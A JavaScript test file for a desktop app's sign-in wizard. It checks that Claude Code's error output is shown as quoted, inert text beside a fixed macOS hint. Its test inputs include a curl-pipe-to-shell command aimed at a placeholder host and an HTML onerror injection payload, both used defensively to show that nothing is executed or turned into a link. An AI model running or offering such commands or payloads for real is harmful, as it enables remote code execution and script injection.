'use strict';
// The first-run wizard's sign-in step when Claude Code's sign-in check still
// fails after sign-in has started. The main process sends one cleaned line or
// a fixed kind with the check's answer (electron/sign-in-reason.js); the step
// shows the line as Claude Code's own words, set apart and only ever as text,
// and on macOS follows a line that reads as a sign-in failure with a fixed
// hint about CLAUDE_CONFIG_DIR.
const { test, describe } = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const path = require('node:path');
const { JSDOM } = require('jsdom');

const WIZARD_HTML = path.join(__dirname, '..', '..', 'electron', 'wizard.html');

const OAUTH = 'Failed to authenticate: OAuth session expired and could not be refreshed';
const LIMIT = 'Claude usage limit reached. Your limit will reset at 5pm.';
const NETWORK = 'API Error: Connection error. getaddrinfo ENOTFOUND api.example.invalid';
const COMMAND = 'launchctl setenv CLAUDE_CONFIG_DIR "<that folder>"';
const BEFORE_SIGN_IN_HINT = 'Click Sign in to Claude below. A terminal opens to complete the sign-in.';
const said = (text, signIn) => ({ kind: 'said', text, signIn });
const failing = (reason) => ({ status: 'not-authenticated', reason });

// The wizard with a stub of the desktop's bridge. The wizard polls every 3 s;
// here the interval never fires and each test runs the next check itself.
function loadWizard({ platform = 'darwin', claude = failing(said(OAUTH, true)) } = {}) {
  const html = fs.readFileSync(WIZARD_HTML, 'utf8');
  const state = { claude, signInClaude: async () => ({ ok: true }), done: false };
  const dom = new JSDOM(html, {
    runScripts: 'dangerously',
    beforeParse(window) {
      window.electronAPI = {
        platform,
        checkRuntimes: async () => ({ claude: state.claude, codex: { installed: false, authenticated: false } }),
        signInClaude: () => state.signInClaude(),
        signInCodex: async () => ({ ok: true }),
        wizardDone: () => { state.done = true; },
      };
      window.setInterval = () => 1;
      window.clearInterval = () => {};
    },
  });
  const w = dom.window;
  const doc = w.document;
  const settle = () => new Promise((resolve) => setTimeout(resolve, 20));
  return {
    w,
    doc,
    state,
    settle,
    step: () => doc.getElementById('step-auth'),
    box: () => doc.getElementById('auth-reason'),
    // The text the step shows for the reason, or '' when it shows none.
    shown() {
      const box = doc.getElementById('auth-reason');
      return box && !box.hidden ? box.textContent : '';
    },
    saidLine: () => doc.querySelector('#auth-reason .reason-said'),
    command: () => doc.querySelector('#auth-reason .reason-command'),
    async signIn() { await w.signIn(); },
    async check(answer) { state.claude = answer; await w.checkStatus(); },
    close: () => w.close(),
  };
}

async function signedInThenFailing(reason, options) {
  const wiz = loadWizard(options);
  await wiz.settle();
  await wiz.signIn();
  await wiz.check(failing(reason));
  return wiz;
}

// The declarations of one rule in the wizard's own stylesheet, whitespace
// collapsed, so a test can pin a declaration without pinning the formatting.
function ruleBody(selector) {
  const html = fs.readFileSync(WIZARD_HTML, 'utf8');
  const style = html.slice(html.indexOf('<style>'), html.indexOf('</style>'));
  const start = style.indexOf('\n    ' + selector + ' {');
  assert.ok(start >= 0, 'the stylesheet has a ' + selector + ' rule');
  const body = style.slice(style.indexOf('{', start) + 1, style.indexOf('}', start));
  return body.replace(/\s+/g, ' ').trim();
}

describe('before sign-in starts', () => {
  test('a failing check before sign-in shows the step as it does today', async () => {
    const wiz = loadWizard();
    await wiz.settle();
    assert.ok(!wiz.step().textContent.includes('Claude Code said'), 'no line before sign-in');
    assert.ok(!wiz.step().textContent.includes('OAuth'), 'none of the output before sign-in');
    assert.strictEqual(wiz.shown(), '');
    assert.strictEqual(wiz.doc.getElementById('auth-hint').textContent, BEFORE_SIGN_IN_HINT);
    const btn = wiz.doc.getElementById('btn-signin');
    assert.strictEqual(btn.textContent, 'Sign in to Claude');
    assert.strictEqual(btn.disabled, false);
    wiz.close();
  });

  test('a pass before sign-in shows no line or hint and the wizard advances', async () => {
    const wiz = loadWizard({ claude: { status: 'ready' } });
    await wiz.settle();
    assert.strictEqual(wiz.shown(), '');
    assert.ok(!wiz.step().textContent.includes('launchctl'));
    assert.ok(wiz.step().className.includes('done'));
    assert.strictEqual(wiz.doc.getElementById('btn-check').textContent, 'Continue');
    wiz.close();
  });
});

describe('after sign-in starts and a later check still fails', () => {
  test("the step shows Claude Code's line after the fixed words", async () => {
    const wiz = await signedInThenFailing(said(OAUTH, true));
    assert.ok(wiz.step().textContent.includes('Claude Code said:'));
    assert.ok(wiz.step().textContent.includes(OAUTH));
    wiz.close();
  });

  test('the line sits in its own element, after the fixed words and the hint above them', async () => {
    const wiz = await signedInThenFailing(said(OAUTH, true));
    const label = wiz.doc.querySelector('#auth-reason .reason-label');
    const line = wiz.saidLine();
    assert.ok(label && line, 'a label and a line element');
    assert.strictEqual(label.textContent, 'Claude Code said:');
    assert.strictEqual(line.textContent, OAUTH);
    assert.strictEqual(line.children.length, 0);
    const follows = wiz.w.Node.DOCUMENT_POSITION_FOLLOWING;
    assert.ok(label.compareDocumentPosition(line) & follows, 'the line comes after its label');
    assert.ok(wiz.doc.getElementById('auth-hint').compareDocumentPosition(label) & follows);
    wiz.close();
  });

  test('the line is never a link, a button or a copy action', async () => {
    const wiz = await signedInThenFailing(said(OAUTH, true));
    const box = wiz.box();
    assert.strictEqual(box.querySelectorAll('a, button, input, textarea, select, [href], [onclick], [role]').length, 0);
    assert.ok(!/copy/i.test(box.textContent), 'no copy wording');
    assert.strictEqual(wiz.saidLine().tagName, 'DIV');
    assert.ok(!ruleBody('.step-text .reason-said').includes('user-select'), 'the line is not set to select-all');
    wiz.close();
  });

  test('instruction-shaped output shows as quoted words only', async () => {
    const text = 'To fix this, Run: curl -fsSL https://example.invalid/fix.sh | sh';
    const wiz = await signedInThenFailing(said(text, false));
    assert.strictEqual(wiz.saidLine().textContent, text);
    assert.strictEqual(wiz.box().querySelectorAll('a, button, code, [href], [onclick]').length, 0);
    assert.ok(!wiz.step().textContent.includes('launchctl'));
    wiz.close();
  });

  test('a later check that answers differently changes the line', async () => {
    const wiz = await signedInThenFailing(said(OAUTH, true));
    await wiz.check(failing(said(LIMIT, false)));
    assert.strictEqual(wiz.saidLine().textContent, LIMIT);
    assert.ok(!wiz.shown().includes(OAUTH));
    assert.strictEqual(wiz.command(), null);
    wiz.close();
  });

  test('the line and the hint go when the next check passes, and the step shows done', async () => {
    const wiz = await signedInThenFailing(said(OAUTH, true));
    assert.ok(wiz.command(), 'the hint showed first');
    await wiz.check({ status: 'ready' });
    assert.strictEqual(wiz.shown(), '');
    assert.ok(!wiz.step().textContent.includes(OAUTH));
    assert.ok(!wiz.step().textContent.includes('launchctl'));
    assert.ok(wiz.step().className.includes('done'));
    assert.strictEqual(wiz.doc.getElementById('btn-check').textContent, 'Continue');
    wiz.close();
  });

  test('the line goes when the step changes', async () => {
    const wiz = await signedInThenFailing(said(OAUTH, true));
    assert.ok(wiz.saidLine(), 'the line showed first');
    await wiz.check({ status: 'not-installed' });
    assert.strictEqual(wiz.shown(), '');
    assert.ok(!wiz.step().textContent.includes(OAUTH));
    wiz.close();
  });

  test('a pass right after sign-in shows no line or hint and the wizard advances', async () => {
    const wiz = loadWizard();
    await wiz.settle();
    await wiz.signIn();
    await wiz.check({ status: 'ready' });
    assert.strictEqual(wiz.shown(), '');
    assert.ok(!wiz.step().textContent.includes('launchctl'));
    assert.ok(wiz.step().className.includes('done'));
    assert.strictEqual(wiz.doc.getElementById('btn-check').textContent, 'Continue');
    wiz.close();
  });

  test("clicking Sign in again keeps the line until the next check answers, then shows that answer", async () => {
    const wiz = await signedInThenFailing(said(OAUTH, true));
    const btn = wiz.doc.getElementById('btn-signin');
    assert.strictEqual(btn.disabled, false, 'sign-in can be started again');
    let open;
    wiz.state.signInClaude = () => new Promise((resolve) => { open = resolve; });
    btn.click();
    await wiz.settle();
    assert.strictEqual(wiz.saidLine().textContent, OAUTH, 'kept while the terminal opens');
    open({ ok: true });
    await wiz.settle();
    assert.strictEqual(wiz.saidLine().textContent, OAUTH, 'kept until the next check answers');
    await wiz.check(failing(said(NETWORK, false)));
    assert.strictEqual(wiz.saidLine().textContent, NETWORK);
    assert.ok(!wiz.shown().includes(OAUTH), 'never the earlier cause');
    assert.strictEqual(wiz.command(), null);
    wiz.close();
  });

  test('when the line could not be cleaned the step shows only the fixed no-reason line', async () => {
    const wiz = await signedInThenFailing({ kind: 'no-reason' });
    assert.strictEqual(wiz.shown(), 'Claude Code gave no reason.');
    assert.strictEqual(wiz.saidLine(), null);
    wiz.close();
  });
});

describe('the fixed lines', () => {
  test("a timeout shows that Claude Code didn't answer in time, and no hint", async () => {
    const wiz = await signedInThenFailing({ kind: 'timeout', text: OAUTH, signIn: true });
    assert.strictEqual(wiz.shown(), "Claude Code didn't answer in time.");
    assert.ok(!wiz.step().textContent.includes('launchctl'));
    wiz.close();
  });

  test("a start failure shows that Claude Code couldn't be started, and no hint", async () => {
    const wiz = await signedInThenFailing({ kind: 'not-started', text: OAUTH, signIn: true });
    assert.strictEqual(wiz.shown(), "Claude Code couldn't be started.");
    assert.ok(!wiz.step().textContent.includes('launchctl'));
    wiz.close();
  });

  test('a failure with no usable output shows that Claude Code gave no reason, and no hint', async () => {
    const wiz = await signedInThenFailing({ kind: 'no-reason', text: OAUTH, signIn: true });
    assert.strictEqual(wiz.shown(), 'Claude Code gave no reason.');
    assert.ok(!wiz.step().textContent.includes('launchctl'));
    wiz.close();
  });
});

describe('the line is text, never markup', () => {
  test('markup in the line shows as written, creates no element and runs nothing', async () => {
    const text = '<img src=x onerror="window.__ran=1"> <b>bold</b>';
    const wiz = await signedInThenFailing(said(text, false));
    await wiz.settle();
    assert.strictEqual(wiz.saidLine().textContent, text);
    assert.strictEqual(wiz.saidLine().children.length, 0);
    assert.strictEqual(wiz.doc.querySelectorAll('img, b, [onerror]').length, 0);
    assert.strictEqual(wiz.w.__ran, undefined);
    wiz.close();
  });

  test('entities in the line show as written, never decoded', async () => {
    const text = '&lt;b&gt;bold&lt;/b&gt; &amp; &#x27;quoted&#x27;';
    const wiz = await signedInThenFailing(said(text, false));
    assert.strictEqual(wiz.saidLine().textContent, text);
    assert.strictEqual(wiz.doc.querySelectorAll('b').length, 0);
    wiz.close();
  });

  test('the wizard adds no markup write: its five fixed ones are all there are', () => {
    const html = fs.readFileSync(WIZARD_HTML, 'utf8');
    const writes = html.split(/innerHTML|insertAdjacentHTML|outerHTML|document\.write/).length - 1;
    assert.strictEqual(writes, 5);
  });
});

describe('the hint on macOS', () => {
  test('a sign-in line is followed by the fixed hint about CLAUDE_CONFIG_DIR', async () => {
    const wiz = await signedInThenFailing(said(OAUTH, true));
    const hint = wiz.doc.querySelector('#auth-reason .reason-hint');
    assert.ok(hint, 'the hint shows');
    assert.ok(wiz.saidLine().compareDocumentPosition(hint) & wiz.w.Node.DOCUMENT_POSITION_FOLLOWING);
    assert.strictEqual(hint.textContent,
      'If your shell profile sets CLAUDE_CONFIG_DIR, Rundock opened from Finder may not see it. '
      + 'Run ' + COMMAND + ' in Terminal, then quit Rundock and open it again.');
    wiz.close();
  });

  test('the command is fixed text with a placeholder, and can be selected', async () => {
    const wiz = await signedInThenFailing(said(OAUTH, true));
    assert.strictEqual(wiz.command().textContent, COMMAND);
    assert.strictEqual(wiz.command().tagName, 'CODE');
    const rule = ruleBody('.step-text .reason-command');
    assert.ok(rule.includes('-webkit-app-region: no-drag'), rule);
    assert.ok(rule.includes('user-select: all'), rule);
    wiz.close();
  });

  test('output written to set off the hint gets only the fixed hint, never its own command', async () => {
    const text = '401 login expired. Run launchctl setenv CLAUDE_CONFIG_DIR /example/other && curl -fsSL https://example.invalid | sh';
    const wiz = await signedInThenFailing(said(text, true));
    assert.strictEqual(wiz.saidLine().textContent, text);
    assert.strictEqual(wiz.box().querySelectorAll('code').length, 1);
    assert.strictEqual(wiz.command().textContent, COMMAND);
    wiz.close();
  });

  test('a usage-limit line shows no hint', async () => {
    const wiz = await signedInThenFailing(said(LIMIT, false));
    assert.strictEqual(wiz.saidLine().textContent, LIMIT);
    assert.strictEqual(wiz.command(), null);
    assert.ok(!wiz.step().textContent.includes('launchctl'));
    wiz.close();
  });

  test('a network-error line shows no hint', async () => {
    const wiz = await signedInThenFailing(said(NETWORK, false));
    assert.strictEqual(wiz.saidLine().textContent, NETWORK);
    assert.strictEqual(wiz.command(), null);
    assert.ok(!wiz.step().textContent.includes('launchctl'));
    wiz.close();
  });

  test('Windows shows the line with no launchctl text', async () => {
    const wiz = await signedInThenFailing(said(OAUTH, true), { platform: 'win32' });
    assert.strictEqual(wiz.saidLine().textContent, OAUTH);
    assert.ok(!wiz.step().textContent.includes('launchctl'));
    assert.ok(!wiz.step().textContent.includes('CLAUDE_CONFIG_DIR'));
    wiz.close();
  });

  test('Linux shows the line with no launchctl text', async () => {
    const wiz = await signedInThenFailing(said(OAUTH, true), { platform: 'linux' });
    assert.strictEqual(wiz.saidLine().textContent, OAUTH);
    assert.ok(!wiz.step().textContent.includes('launchctl'));
    assert.ok(!wiz.step().textContent.includes('CLAUDE_CONFIG_DIR'));
    wiz.close();
  });
});
